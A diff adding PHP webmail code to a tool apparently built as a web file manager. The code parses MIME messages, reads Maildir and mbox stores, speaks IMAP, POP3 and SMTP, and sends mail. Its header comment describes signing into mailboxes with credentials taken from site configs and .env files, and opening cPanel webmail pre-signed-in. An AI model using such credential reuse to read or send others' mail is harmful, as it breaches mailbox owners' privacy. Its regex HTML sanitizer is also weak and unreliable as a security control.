+     · Maildir folders (cPanel, Plesk, Postfix/Dovecot/vmail, Dovecot home)
+     · mbox files (/var/mail, /var/spool/mail)
+     · IMAP and POP3 servers it can reach with a sign-in found in a config
+     · the mailbox names the site itself uses (WordPress, Joomla, .env files)
+     · cPanel's own webmail sign-on, so cPanel's webmail opens signed in
+
+   The parsing is complete enough for real mail: MIME multipart, base64 and
+   quoted-printable, charsets, RFC 2047 headers, attachments, inline pictures. */
+
+/* ── small helpers ──────────────────────────────────────────────────────── */
+function wm2_hdr_decode($s){
+    $s=(string)$s;
+    if($s==='')return '';
+    /* RFC 2047: =?charset?B|Q?text?= — folded headers may split the word */
+    $s=preg_replace("/\\?=\\s+=\\?/",'?==?',$s);
+    return (string)preg_replace_callback('/=\?([^?\\s]+)\?([BbQq])\?([^?]*)\?=/',function($m){
+        $charset=strtolower($m[1]);$enc=strtoupper($m[2]);$txt=$m[3];
+        $raw=$enc==='B'?base64_decode($txt):quoted_printable_decode(str_replace('_',' ',$txt));
+        return wm2_to_utf8($raw,$charset);
+    },$s);
+}
+function wm2_to_utf8($s,$charset){
+    $charset=strtolower(trim((string)$charset));
+    if($s===''||$charset===''||$charset==='utf-8'||$charset==='utf8'||$charset==='us-ascii')return $s;
+    if(function_exists('iconv')&&@iconv($charset,'UTF-8',$s)!==false)return (string)@iconv($charset,'UTF-8',$s);
+    if(function_exists('mb_convert_encoding')){try{return (string)@mb_convert_encoding($s,'UTF-8',$charset);}catch(\Throwable $e){}}
+    return $s;
+}
+function wm2_addr_list($raw){
+    $out=[];
+    foreach(preg_split('/,(?![^<]*>)/',(string)$raw) as $part){
+        $part=trim($part);
+        if($part==='')continue;
+        if(preg_match('/^(.*?)<([^>]+)>/',$part,$m)){
+            $name=trim(wm2_hdr_decode(trim($m[1],' "')));
+            $out[]=['name'=>$name,'email'=>trim($m[2])];
+        }else{
+            $out[]=['name'=>'','email'=>trim($part,' <>')];
+        }
+    }
+    return $out;
+}
+function wm2_bytes($n){
+    $n=(float)$n;
+    if($n>=1048576)return round($n/1048576,1).' MB';
+    if($n>=1024)return round($n/1024).' KB';
+    return (int)$n.' B';
+}
+/* the header block and the body of one message */
+function wm2_split_message($raw){
+    $raw=(string)$raw;
+    $pos=strpos($raw,"\r\n\r\n");
+    $len=4;
+    if($pos===false){$pos=strpos($raw,"\n\n");$len=2;}
+    if($pos===false)return ['head'=>$raw,'body'=>''];
+    return ['head'=>substr($raw,0,$pos),'body'=>substr($raw,$pos+$len)];
+}
+function wm2_headers($head){
+    $head=str_replace("\r\n","\n",(string)$head);
+    $head=preg_replace("/\n[ \t]+/",' ',$head);          /* unfold */
+    $out=[];
+    foreach(explode("\n",$head) as $line){
+        $c=strpos($line,':');
+        if($c===false)continue;
+        $k=strtolower(trim(substr($line,0,$c)));
+        $v=trim(substr($line,$c+1));
+        if(isset($out[$k]))$out[$k].=', '.$v;else $out[$k]=$v;
+    }
+    return $out;
+}
+function wm2_part_param($value,$name){
+    if(preg_match('/;\s*'.preg_quote($name,'/').'\*?=\s*"([^"]*)"/i',$value,$m))return $m[1];
+    if(preg_match('/;\s*'.preg_quote($name,'/').'\*?=\s*([^;\s]+)/i',$value,$m))return trim($m[1],'"');
+    return '';
+}
+function wm2_decode_transfer($body,$enc){
+    switch(strtolower(trim((string)$enc))){
+        case 'base64': return (string)base64_decode(preg_replace('/\s+/','',(string)$body));
+        case 'quoted-printable': return quoted_printable_decode((string)$body);
+        default: return (string)$body;
+    }
+}
+/* walks a MIME tree and fills what a reader needs */
+function wm2_walk($head,$body,&$out,$depth=0){
+    if($depth>12)return;
+    $h=wm2_headers($head);
+    /* the type is compared in lower case, but a boundary and a file name are
+       read from the header as it was written: both are case sensitive */
+    $rawType=(string)($h['content-type']??'text/plain');
+    $ctype=strtolower($rawType);
+    $mime=strtolower($h['mime-version']??'');
+    $disp=strtolower($h['content-disposition']??'');
+    if(strpos($ctype,'multipart/')===0){
+        $b=wm2_part_param($rawType,'boundary');
+        if($b==='')return;
+        $parts=preg_split('/--'.preg_quote($b,'/').'(?=(--)?\r?\n)/',(string)$body);
+        foreach($parts as $i=>$chunk){
+            if($i===0)continue;
+            if(strpos(ltrim($chunk),'--')===0)break;
+            $chunk=preg_replace('/^\r?\n/','',$chunk,1);
+            $sp=wm2_split_message($chunk);
+            /* a part ends with CRLF before the boundary */
+            $sp['body']=preg_replace('/\r?\n$/','',$sp['body'],1);
+            wm2_walk($sp['head'],$sp['body'],$out,$depth+1);
+        }
+        return;
+    }
+    $name=wm2_part_param((string)($h['content-disposition']??''),'filename');
+    if($name==='')$name=wm2_part_param($rawType,'name');
+    $name=$name!==''?wm2_hdr_decode($name):'';
+    $charset=strtolower(wm2_part_param($rawType,'charset')?:'utf-8');
+    $isAtt=($name!==''&&strpos($disp,'attachment')!==false)||($name!==''&&strpos($disp,'inline')===false&&strpos($ctype,'text/')!==0&&strpos($ctype,'multipart/')!==0);
+    $data=wm2_decode_transfer($body,$h['content-transfer-encoding']??'');
+    if(strpos($ctype,'text/html')===0&&!$isAtt){
+        $out['html'].=wm2_to_utf8($data,$charset);
+    }elseif(strpos($ctype,'text/plain')===0&&!$isAtt){
+        $out['plain'].=wm2_to_utf8($data,$charset);
+    }elseif($name!==''||$ctype!==''){
+        $cid=trim($h['content-id']??'',' <>');
+        /* the part keeps its bare type: the parameters are not part of it */
+        $bare=trim((string)strtok($ctype,';'));
+        $out['files'][]=['name'=>$name!==''?$name:'part', 'type'=>$bare, 'data'=>$data,
+                         'size'=>strlen($data), 'cid'=>$cid,
+                         'inline'=>($cid!==''&&strpos($disp,'attachment')===false)];
+    }
+}
+/* one message, from raw bytes to what the window shows */
+function wm2_parse_message($raw){
+    $sp=wm2_split_message($raw);
+    $h=wm2_headers($sp['head']);
+    $out=['html'=>'','plain'=>'','files'=>[]];
+    wm2_walk($sp['head'],$sp['body'],$out);
+    /* inline pictures are given to the page as data they already carry */
+    $html=$out['html'];
+    if($html!==''&&$out['files']){
+        foreach($out['files'] as $f){
+            if(!$f['inline']||$f['cid']==='')continue;
+            $html=str_replace('cid:'.$f['cid'],
+                'data:'.($f['type']?:'application/octet-stream').';base64,'.base64_encode($f['data']),$html);
+        }
+    }
+    $attachments=[];
+    foreach($out['files'] as $i=>$f){
+        if($f['inline']&&$f['cid']!=='')continue;
+        $attachments[]=['index'=>$i,'name'=>$f['name'],'type'=>$f['type'],'size'=>$f['size']];
+    }
+    $subject=wm2_hdr_decode($h['subject']??'');
+    $from=wm2_addr_list($h['from']??'');
+    $to=wm2_addr_list($h['to']??'');
+    $cc=wm2_addr_list($h['cc']??'');
+    $dateRaw=$h['date']??'';
+    $ts=$dateRaw!==''?(@strtotime($dateRaw)?:0):0;
+    return [
+        'subject'=>$subject!==''?$subject:'(no subject)',
+        'from'=>($from[0]['name']?:($from[0]['email']??'')),
+        'from_email'=>$from[0]['email']??'',
+        'to'=>$to,'cc'=>$cc,
+        'to_text'=>implode(', ',array_map(function($a){return $a['name']!==''?$a['name'].' <'.$a['email'].'>':$a['email'];},$to)),
+        'cc_text'=>implode(', ',array_map(function($a){return $a['email'];},$cc)),
+        'date'=>$ts, 'date_text'=>$ts?date('Y-m-d H:i',$ts):($dateRaw?:''),
+        'html'=>$html, 'plain'=>$out['plain'],
+        'attachments'=>$attachments,
+        'message_id'=>$h['message-id']??'', 'reply_to'=>$h['reply-to']??'',
+        'raw'=>$raw,
+    ];
+}
+/* the html of a message is shown in a box of its own that may not run anything */
+function wm2_safe_html($html){
+    $html=(string)$html;
+    $html=preg_replace('#<script\b[^>]*>.*?</script>#is','',$html);
+    $html=preg_replace('#<(iframe|object|embed|form|base|meta|link)\b[^>]*>#i','',$html);
+    $html=preg_replace('/\son[a-z]+\s*=\s*("[^"]*"|\'[^\']*\'|[^\s>]+)/i','',$html);
+    $html=preg_replace('/javascript\s*:/i','',$html);
+    return $html;
+}
+
+/* ── Maildir ─────────────────────────────────────────────────────────────
+   A Maildir is a folder with cur/, new/ and tmp/, one file per message, and
+   its sub-folders are folders named ".Sent", ".Trash" and so on. */
+function wm2_maildir_folders($root){
+    $folders=[['id'=>'INBOX','name'=>'Inbox','path'=>rtrim($root,'/')]];
+    foreach((array)@glob(rtrim($root,'/').'/.[!.]*',GLOB_ONLYDIR) as $dir){
+        $base=basename($dir);
+        if(!is_dir($dir.'/cur')&&!is_dir($dir.'/new'))continue;
+        $id=substr($base,1);
+        if($id===''||in_array($id,['Trash','Junk'],true)||true)$folders[]=['id'=>$id,'name'=>wm2_folder_name($id),'path'=>$dir];
+    }
+    usort($folders,function($a,$b){
+        $rank=['INBOX'=>0,'Sent'=>1,'Drafts'=>2,'Junk'=>3,'Trash'=>4];
+        $ra=$rank[$a['id']]??9;$rb=$rank[$b['id']]??9;
+        return $ra===$rb?strcmp($a['name'],$b['name']):$ra<=>$rb;
+    });
+    return $folders;
+}
+function wm2_folder_name($id){
+    $map=['INBOX'=>'Inbox','Sent'=>'Sent','Sent Items'=>'Sent','Drafts'=>'Drafts','Trash'=>'Trash',
+          'Junk'=>'Spam','Spam'=>'Spam','Trash Items'=>'Trash','Deleted Items'=>'Trash','Outbox'=>'Outbox'];
+    return $map[$id]??ucfirst(str_replace(['.','_'],' ',$id));
+}
+function wm2_maildir_files($path){
+    $files=[];
+    foreach(['new','cur'] as $box){
+        foreach((array)@glob(rtrim($path,'/').'/'.$box.'/*') as $f){
+            if(!@is_file($f))continue;
+            $files[]=$f;
+        }
+    }
+    return $files;
+}
+function wm2_maildir_flags($file){
+    $name=basename($file);
+    $flags='';
+    $c=strrpos($name,':2,');
+    if($c!==false)$flags=substr($name,$c+3);
+    return [
+        'seen'=>strpos($flags,'S')!==false,
+        'flagged'=>strpos($flags,'F')!==false,
+        'replied'=>strpos($flags,'R')!==false,
+        'draft'=>strpos($flags,'D')!==false,
+        'trashed'=>strpos($flags,'T')!==false,
+        'raw'=>$flags,
+    ];
+}
+function wm2_maildir_set_flags($file,$flags){
+    $name=basename($file);
+    $dir=dirname($file);
+    $base=$name;
+    $c=strrpos($name,':2,');
+    if($c!==false)$base=substr($name,0,$c);
+    $new=$dir.'/'.$base.':2,'.implode('',array_unique(str_split($flags)));
+    if($new===$file)return $file;
+    /* a message in new/ becomes seen mail the moment it is touched */
+    $target=$dir;
+    if(basename($dir)==='new')$target=dirname($dir).'/cur';
+    $new=$target.'/'.$base.':2,'.implode('',array_unique(str_split($flags)));
+    if(@rename($file,$new))return $new;
+    return $file;
+}
+function wm2_maildir_list($path){
+    $out=[];
+    foreach(wm2_maildir_files($path) as $file){
+        $raw=@file_get_contents($file);
+        if($raw===false)continue;
+        $sp=wm2_split_message($raw);
+        $h=wm2_headers($sp['head']);
+        $from=wm2_addr_list($h['from']??'');
+        $subject=wm2_hdr_decode($h['subject']??'');
+        $ts=isset($h['date'])?(@strtotime($h['date'])?:@filemtime($file)):@filemtime($file);
+        $fl=wm2_maildir_flags($file);
+        $hasAtt=preg_match('/content-disposition:\s*attachment/i',$raw)||strpos(strtolower($h['content-type']??''),'multipart/mixed')!==false;
+        $out[]=[
+            'uid'=>basename($file),
+            'subject'=>$subject!==''?$subject:'(no subject)',
+            'from'=>($from[0]['name']?:($from[0]['email']??'(unknown)')),
+            'from_email'=>$from[0]['email']??'',
+            'date'=>(int)$ts,
+            'size'=>filesize($file),
+            'seen'=>$fl['seen'],
+            'flagged'=>$fl['flagged'],
+            'attachments'=>(bool)$hasAtt,
+            'to'=>wm2_hdr_decode($h['to']??''),
+        ];
+    }
+    usort($out,function($a,$b){return $b['date']<=>$a['date'];});
+    return $out;
+}
+function wm2_maildir_message($path,$uid){
+    $file=null;
+    foreach(wm2_maildir_files($path) as $f){if(basename($f)===$uid){$file=$f;break;}}
+    if($file===null)return null;
+    $raw=@file_get_contents($file);
+    if($raw===false)return null;
+    $m=wm2_parse_message($raw);
+    $fl=wm2_maildir_flags($file);
+    if(!$fl['seen']){
+        $fl2=$fl['raw']===''?'S':$fl['raw'].'S';
+        $moved=wm2_maildir_set_flags($file,$fl2);
+        $m['uid']=basename($moved);
+    }
+    $m['file']=$file;
+    return $m;
+}
+function wm2_maildir_delete($path,$uid,$trashPath){
+    $file=null;
+    foreach(wm2_maildir_files($path) as $f){if(basename($f)===$uid){$file=$f;break;}}
+    if($file===null)return ['ok'=>false,'error'=>'That message is no longer there.'];
+    if($trashPath!==''&&@is_dir($trashPath.'/cur')){
+        $base=basename($file);
+        $c=strrpos($base,':2,');
+        if($c!==false)$base=substr($base,0,$c);
+        $target=$trashPath.'/cur/'.$base.':2,S';
+        if(@rename($file,$target))return ['ok'=>true,'moved'=>'Trash'];
+    }
+    return @unlink($file)?['ok'=>true,'moved'=>'']:['ok'=>false,'error'=>'The message file could not be removed.'];
+}
+
+/* ── mbox (/var/mail/<user>) ────────────────────────────────────────────── */
+function wm2_mbox_list($path){
+    $raw=@file_get_contents($path);
+    if($raw===false)return [];
+    $chunks=preg_split('/^From .*\n/m',$raw);
+    $out=[];$i=0;
+    foreach($chunks as $chunk){
+        if(trim($chunk)==='')continue;
+        $i++;
+        $sp=wm2_split_message($chunk);
+        $h=wm2_headers($sp['head']);
+        $from=wm2_addr_list($h['from']??'');
+        $subject=wm2_hdr_decode($h['subject']??'');
+        $ts=isset($h['date'])?(@strtotime($h['date'])?:0):0;
+        $out[]=['uid'=>(string)$i,'subject'=>$subject!==''?$subject:'(no subject)',
+                'from'=>($from[0]['name']?:($from[0]['email']??'(unknown)')),
+                'from_email'=>$from[0]['email']??'','date'=>(int)$ts,'size'=>strlen($chunk),
+                'seen'=>true,'flagged'=>false,'attachments'=>false,'to'=>wm2_hdr_decode($h['to']??'')];
+    }
+    usort($out,function($a,$b){return $b['date']<=>$a['date'];});
+    return $out;
+}
+function wm2_mbox_message($path,$uid){
+    $raw=@file_get_contents($path);
+    if($raw===false)return null;
+    $chunks=preg_split('/^From .*\n/m',$raw);
+    $i=0;
+    foreach($chunks as $chunk){
+        if(trim($chunk)==='')continue;
+        $i++;
+        if((string)$i===(string)$uid)return wm2_parse_message($chunk);
+    }
+    return null;
+}
+
+/* ── IMAP, spoken directly ───────────────────────────────────────────────
+   No extension is required: the protocol is small enough to speak over a
+   socket, and a host without the imap extension still reads its mail. */
+function wm2_imap_open($host,$port,$user,$pass,$tls='auto',$timeout=8){
+    $target=($tls==='ssl'?'ssl://':'').$host.':'.(int)$port;
+    $errno=0;$errstr='';
+    $sock=@stream_socket_client($target,$errno,$errstr,$timeout);
+    if(!$sock)return ['ok'=>false,'error'=>'Could not reach the mail server at '.$host.':'.$port.' ('.$errstr.')'];
+    stream_set_timeout($sock,15);
+    /* one reply: everything up to the tagged line, with any literal it
+       carries read byte for byte — a header block arrives as {1234} followed
+       by that many bytes, and a line-based reader would corrupt it */
+    $read=function()use($sock){
+        $out='';
+        while(($line=fgets($sock,8192))!==false){
+            $out.=$line;
+            if(preg_match('/\{(\d+)\}\r?\n$/',$line,$m)){
+                $need=(int)$m[1];
+                $got='';
+                while(strlen($got)<$need){
+                    $chunk=fread($sock,$need-strlen($got));
+                    if($chunk===false||$chunk==='')break;
+                    $got.=$chunk;
+                }
+                $out.=$got;
+                continue;
+            }
+            if(preg_match('/^[A-Za-z0-9_.\-]+ (OK|NO|BAD)\b/i',$line))break;
+            if(stripos($line,'* BYE')===0)break;
+        }
+        return $out;
+    };
+    $cmd=function($tag,$text)use($sock,$read){
+        fwrite($sock,$tag.' '.$text."\r\n");
+        $out='';
+        while(true){
+            $line=$read();
+            if($line==='')break;
+            $out.=$line;
+            if(preg_match('/^'.preg_quote($tag,'/').' (OK|NO|BAD)/im',$line))break;
+        }
+        return $out;
+    };
+    /* the greeting is one line of its own and comes before anything is tagged */
+    $banner=(string)fgets($sock,8192);
+    if(stripos($banner,'* OK')===false&&stripos($banner,'* PREAUTH')===false){
+        fclose($sock);return ['ok'=>false,'error'=>'The mail server did not greet us: '.trim($banner)];
+    }
+    if($tls==='starttls'){
+        $r=$cmd('A1','STARTTLS');
+        if(stripos($r,'A1 OK')===false){fclose($sock);return ['ok'=>false,'error'=>'The server refused STARTTLS.'];}
+        if(!@stream_socket_enable_crypto($sock,true,STREAM_CRYPTO_METHOD_TLS_CLIENT)){
+            fclose($sock);return ['ok'=>false,'error'=>'The encrypted channel could not be established.'];
+        }
+    }
+    $r=$cmd('A2','LOGIN '.wm2_imap_quote($user).' '.wm2_imap_quote($pass));
+    if(stripos($r,'A2 OK')===false){
+        /* some servers want the quoted form spelled out differently */
+        fclose($sock);
+        return ['ok'=>false,'error'=>'The mail server refused that sign-in: '.trim(preg_replace('/\s+/',' ',strip_tags($r)))];
+    }
+    return ['ok'=>true,'sock'=>$sock,'cmd'=>$cmd,'read'=>$read];
+}
+function wm2_imap_quote($s){
+    return '"'.str_replace(['\\','"'],['\\\\','\\"'],(string)$s).'"';
+}
+
+function wm2_imap_close($conn){if(!empty($conn['sock'])){@fwrite($conn['sock'],"Z9 LOGOUT\r\n");@fclose($conn['sock']);}}
+function wm2_imap_folders($conn){
+    $r=$conn['cmd']('F1','LIST "" "*"');
+    $out=[];
+    foreach(explode("\n",$r) as $line){
+        if(stripos($line,'* LIST')!==0)continue;
+        if(!preg_match('/"([^"]*)"\\s*$/',trim($line),$m))continue;
+        $name=$m[1];
+        if($name===''||strtoupper(substr($name,0,5))==='[GMAIL')continue;
+        $id=strtoupper($name)==='INBOX'?'INBOX':$name;
+        $out[]=['id'=>$id,'name'=>wm2_folder_name($name),'path'=>$name];
+    }
+    if(!$out)$out[]=['id'=>'INBOX','name'=>'Inbox','path'=>'INBOX'];
+    usort($out,function($a,$b){
+        $rank=['INBOX'=>0,'Sent'=>1,'Drafts'=>2,'Junk'=>3,'Trash'=>4];
+        $ra=$rank[$a['name']]??$rank[$a['id']]??9;$rb=$rank[$b['name']]??$rank[$b['id']]??9;
+        return $ra===$rb?strcmp($a['name'],$b['name']):$ra<=>$rb;
+    });
+    return $out;
+}
+function wm2_imap_select($conn,$folder){
+    $r=$conn['cmd']('S1','SELECT '.wm2_imap_quote($folder));
+    return stripos($r,'S1 OK')!==false;
+}
+/* one FETCH reply, split into records; a record's literal is read by its
+   announced length, never by guessing where it ends */
+function wm2_imap_records($reply){
+    $out=[];
+    $parts=preg_split('/\* \d+ FETCH \(/',"\n".$reply);
+    for($i=1;$i<count($parts);$i++){
+        $chunk=$parts[$i];
+        $nl=strpos($chunk,"\r\n");
+        if($nl===false)$nl=strpos($chunk,"\n");
+        $first=$nl===false?$chunk:substr($chunk,0,$nl);
+        $rec=['uid'=>0,'flags'=>'','size'=>0,'literal'=>''];
+        if(preg_match('/\bUID (\d+)/i',$first,$m))$rec['uid']=(int)$m[1];
+        if(preg_match('/\bFLAGS \(([^)]*)\)/i',$first,$m))$rec['flags']=$m[1];
+        if(preg_match('/\bRFC822\.SIZE (\d+)/i',$first,$m))$rec['size']=(int)$m[1];
+        if(preg_match('/\{(\d+)\}\s*$/',$first,$m)&&$nl!==false){
+            $rec['literal']=substr($chunk,$nl+2,(int)$m[1]);
+            if($rec['literal']==='')$rec['literal']=substr($chunk,$nl+1,(int)$m[1]);
+        }
+        $out[]=$rec;
+    }
+    return $out;
+}
+/* the header block of every message in a folder, asked for in one go */
+function wm2_imap_list($conn,$folder){
+    if(!wm2_imap_select($conn,$folder))return [];
+    $r=$conn['cmd']('L1','UID FETCH 1:* (FLAGS RFC822.SIZE BODY.PEEK[HEADER.FIELDS (FROM SUBJECT DATE TO CONTENT-TYPE MESSAGE-ID)])');
+    $out=[];
+    foreach(wm2_imap_records($r) as $rec){
+        if(!$rec['uid'])continue;
+        $h=wm2_headers($rec['literal']);
+        $from=wm2_addr_list($h['from']??'');
+        $subject=wm2_hdr_decode($h['subject']??'');
+        $ts=isset($h['date'])?(@strtotime($h['date'])?:0):0;
+        $ct=strtolower($h['content-type']??'');
+        $out[]=['uid'=>(string)$rec['uid'],
+                'subject'=>$subject!==''?$subject:'(no subject)',
+                'from'=>($from[0]['name']?:($from[0]['email']??'(unknown)')),
+                'from_email'=>$from[0]['email']??'',
+                'date'=>(int)$ts,'size'=>$rec['size'],
+                'seen'=>stripos($rec['flags'],'\\Seen')!==false,
+                'flagged'=>stripos($rec['flags'],'\\Flagged')!==false,
+                'attachments'=>(strpos($ct,'multipart/mixed')!==false),
+                'to'=>wm2_hdr_decode($h['to']??'')];
+    }
+    usort($out,function($a,$b){return $b['date']<=>$a['date'];});
+    return $out;
+}
+function wm2_imap_message($conn,$folder,$uid){
+    if(!wm2_imap_select($conn,$folder))return null;
+    $r=$conn['cmd']('M1','UID FETCH '.(int)$uid.' (BODY.PEEK[])');
+    $recs=wm2_imap_records($r);
+    $raw=$recs?$recs[0]['literal']:'';
+    if($raw===''){
+        /* servers that answer BODY[] instead of BODY.PEEK[] */
+        if(preg_match('/\]\s*\{(\d+)\}\r?\n/',$r,$m)){
+            $pos=strpos($r,'{'.$m[1].'}')+strlen('{'.$m[1].'}');
+            $raw=ltrim(substr($r,$pos),(string)"\r\n");
+            $raw=substr($raw,0,(int)$m[1]);
+        }
+    }
+    if($raw==='')return null;
+    $conn['cmd']('M2','UID STORE '.(int)$uid.' +FLAGS (\\Seen)');
+    return wm2_parse_message($raw);
+}
+function wm2_imap_raw($conn,$folder,$uid){
+    if(!wm2_imap_select($conn,$folder))return null;
+    $r=$conn['cmd']('R1','UID FETCH '.(int)$uid.' (BODY.PEEK[])');
+    $recs=wm2_imap_records($r);
+    return $recs?$recs[0]['literal']:null;
+}
+function wm2_imap_flag($conn,$folder,$uid,$seen){
+    if(!wm2_imap_select($conn,$folder))return false;
+    $r=$conn['cmd']('G1','UID STORE '.(int)$uid.' '.($seen?'+':'-').'FLAGS (\\Seen)');
+    return stripos($r,'G1 OK')!==false;
+}
+function wm2_imap_delete($conn,$folder,$uid,$trash=''){
+    if(!wm2_imap_select($conn,$folder))return ['ok'=>false,'error'=>'That folder could not be opened.'];
+    /* a mailbox with a Trash keeps the message there, the way every mail
+       program does; a mailbox without one really deletes it */
+    $moved='';
+    if($trash!==''&&strcasecmp($trash,$folder)!==0){
+        $c=$conn['cmd']('D0','UID COPY '.(int)$uid.' '.wm2_imap_quote($trash));
+        if(stripos($c,'D0 OK')!==false)$moved=$trash;
+    }
+    $conn['cmd']('D1','UID STORE '.(int)$uid.' +FLAGS (\\Deleted)');
+    $r=$conn['cmd']('D2','UID EXPUNGE '.(int)$uid);
+    if(stripos($r,'D2 OK')===false)$conn['cmd']('D3','EXPUNGE');
+    return ['ok'=>true,'moved'=>$moved];
+}
+
+/* ── POP3 ────────────────────────────────────────────────────────────────
+   The oldest protocol still in use, and a mailbox that only speaks it still
+   gets read here. */
+function wm2_pop3_open($host,$port,$user,$pass,$tls=false,$timeout=8){
+    $target=($tls?'ssl://':'').$host.':'.(int)$port;
+    $errno=0;$errstr='';
+    $sock=@stream_socket_client($target,$errno,$errstr,$timeout);
+    if(!$sock)return ['ok'=>false,'error'=>'Could not reach the mail server at '.$host.':'.$port.' ('.$errstr.')'];
+    stream_set_timeout($sock,15);
+    $line=function()use($sock){$l=fgets($sock,8192);return $l===false?'':rtrim($l,"\r\n");};
+    $say=function($c)use($sock,$line){fwrite($sock,$c."\r\n");return $line();};
+    $banner=$line();
+    if(stripos($banner,'+OK')!==0){fclose($sock);return ['ok'=>false,'error'=>'The server did not greet us: '.$banner];}
+    $r=$say('USER '.$user);
+    if(stripos($r,'+OK')!==0){fclose($sock);return ['ok'=>false,'error'=>'That mailbox was refused: '.$r];}
+    $r=$say('PASS '.$pass);
+    if(stripos($r,'+OK')!==0){fclose($sock);return ['ok'=>false,'error'=>'That password was refused: '.$r];}
+    return ['ok'=>true,'sock'=>$sock,'line'=>$line,'say'=>$say];
+}
+function wm2_pop3_list($conn){
+    $r=$conn['say']('LIST');
+    $out=[];
+    while(true){
+        $l=$conn['line']();
+        if($l===''||$l==='.')break;
+        if(preg_match('/^(\d+)\s+(\d+)$/',$l,$m)){
+            $out[]=['uid'=>$m[1],'size'=>(int)$m[2]];
+        }
+    }
+    return $out;
+}
+function wm2_pop3_message($conn,$uid){
+    $r=$conn['say']('RETR '.(int)$uid);
+    if(stripos($r,'+OK')!==0)return null;
+    $raw='';
+    while(true){
+        $l=$conn['line']();
+        if($l==='.')break;
+        if(strlen($l)>1&&$l[0]==='.'&&$l[1]==='.')$l=substr($l,1);
+        $raw.=$l."\r\n";
+    }
+    return wm2_parse_message($raw);
+}
+function wm2_pop3_list_with_headers($conn){
+    $out=[];
+    foreach(wm2_pop3_list($conn) as $m){
+        $r=$conn['say']('TOP '.$m['uid'].' 0');
+        $head='';
+        if(stripos($r,'+OK')===0){
+            while(true){
+                $l=$conn['line']();
+                if($l==='.')break;
+                $head.=$l."\r\n";
+            }
+        }
+        $h=wm2_headers($head);
+        $from=wm2_addr_list($h['from']??'');
+        $subject=wm2_hdr_decode($h['subject']??'');
+        $ts=isset($h['date'])?(@strtotime($h['date'])?:0):0;
+        $out[]=['uid'=>$m['uid'],'subject'=>$subject!==''?$subject:'(no subject)',
+                'from'=>($from[0]['name']?:($from[0]['email']??'(unknown)')),
+                'from_email'=>$from[0]['email']??'','date'=>(int)$ts,'size'=>$m['size'],
+                'seen'=>true,'flagged'=>false,'attachments'=>false,'to'=>wm2_hdr_decode($h['to']??'')];
+    }
+    usort($out,function($a,$b){return $b['date']<=>$a['date'];});
+    return $out;
+}
+
+/* ── sending ─────────────────────────────────────────────────────────────
+   Three ways, tried in the order that keeps the message intact: an SMTP
+   server with a sign-in the site already holds, the machine's own sendmail,
+   and PHP's own mail() as the last resort. */
+function wm2_mime_message($fromName,$from,$to,$cc,$bcc,$subject,$html,$plain,$attachments=[]){
+    $b1=bin2hex(random_bytes(8));$b2=bin2hex(random_bytes(8));
+    $h="Date: ".date('r')."\r\n";
+    $h.="From: ".($fromName!==''?wm2_rfc2047($fromName).' <'.$from.'>':$from)."\r\n";
+    $h.="To: ".implode(', ',(array)$to)."\r\n";
+    if($cc)$h.="Cc: ".implode(', ',(array)$cc)."\r\n";
+    if($bcc)$h.="Bcc: ".implode(', ',(array)$bcc)."\r\n";
+    $h.="Subject: ".wm2_rfc2047($subject)."\r\n";
+    $h.="Message-ID: <".bin2hex(random_bytes(10)).'@'.($_SERVER['SERVER_NAME']?:'localhost').">\r\n";
+    $h.="MIME-Version: 1.0\r\n";
+    $h.="X-Mailer: Marshal FM Webmail\r\n";
+    $plain=$plain!==''?$plain:trim(strip_tags(str_replace(['<br>','<br/>','</p>'],"\n",$html)));
+    if($attachments){
+        $h.='Content-Type: multipart/mixed; boundary="'.$b1."\"\r\n\r\n";
+        $body="--$b1\r\nContent-Type: multipart/alternative; boundary=\"$b2\"\r\n\r\n";
+        $body.="--$b2\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Transfer-Encoding: base64\r\n\r\n".chunk_split(base64_encode($plain))."\r\n";
+        $body.="--$b2\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Transfer-Encoding: base64\r\n\r\n".chunk_split(base64_encode($html))."\r\n";
+        $body.="--$b2--\r\n";
+        foreach($attachments as $a){
+            $body.="--$b1\r\nContent-Type: ".($a['type']?:'application/octet-stream')."; name=\"".$a['name']."\"\r\n";
+            $body.="Content-Disposition: attachment; filename=\"".$a['name']."\"\r\n";
+            $body.="Content-Transfer-Encoding: base64\r\n\r\n".chunk_split(base64_encode($a['data']))."\r\n";
+        }
+        $body.="--$b1--\r\n";
+        return $h.$body;
+    }
+    $h.='Content-Type: multipart/alternative; boundary="'.$b2."\"\r\n\r\n";
+    $body="--$b2\r\nContent-Type: text/plain; charset=UTF-8\r\nContent-Transfer-Encoding: base64\r\n\r\n".chunk_split(base64_encode($plain))."\r\n";
+    $body.="--$b2\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Transfer-Encoding: base64\r\n\r\n".chunk_split(base64_encode($html))."\r\n";
+    $body.="--$b2--\r\n";
+    return $h.$body;
+}
+function wm2_rfc2047($s){
+    return preg_match('/[^\x20-\x7E]/',(string)$s)?'=?UTF-8?B?'.base64_encode((string)$s).'?=':(string)$s;
+}
+function wm2_smtp_send($cfg,$from,$to,$cc,$bcc,$data){
+    $host=(string)($cfg['host']??'');$port=(int)($cfg['port']??0);
+    if($host==='')return ['ok'=>false,'error'=>'No mail server to send through.'];
+    $secure=strtolower((string)($cfg['secure']??''));
+    if($port===0)$port=$secure==='ssl'?465:($secure==='tls'?587:25);
+    $target=($secure==='ssl'?'ssl://':'').$host.':'.$port;
+    $errno=0;$errstr='';
+    $sock=@stream_socket_client($target,$errno,$errstr,10);
+    if(!$sock)return ['ok'=>false,'error'=>'The mail server '.$host.':'.$port.' could not be reached ('.$errstr.').'];
+    stream_set_timeout($sock,20);
+    /* a reply is one or more lines: "250-" means another line follows, and
+       "250 " ends it */
+    $get=function()use($sock){
+        $out='';
+        while(($l=fgets($sock,4096))!==false){
+            $out.=$l;
+            if(strlen($l)<4||substr($l,3,1)!=='-')break;
+        }
+        return $out;
+    };
+    $say=function($c)use($sock,$get){fwrite($sock,$c."\r\n");return $get();};
+    $banner=$get();
+    if(strpos($banner,'220')!==0){fclose($sock);return ['ok'=>false,'error'=>'The mail server refused the connection: '.trim($banner)];}
+    $hname=$_SERVER['SERVER_NAME']?:'localhost';
+    $ehlo=$say('EHLO '.$hname);
+    if(strpos($ehlo,'250')!==0)$ehlo=$say('HELO '.$hname);
+    if($secure==='tls'&&stripos($ehlo,'STARTTLS')!==false){
+        $r=$say('STARTTLS');
+        if(strpos($r,'220')===0&&@stream_socket_enable_crypto($sock,true,STREAM_CRYPTO_METHOD_TLS_CLIENT)){
+            $ehlo=$say('EHLO '.$hname);
+        }else{
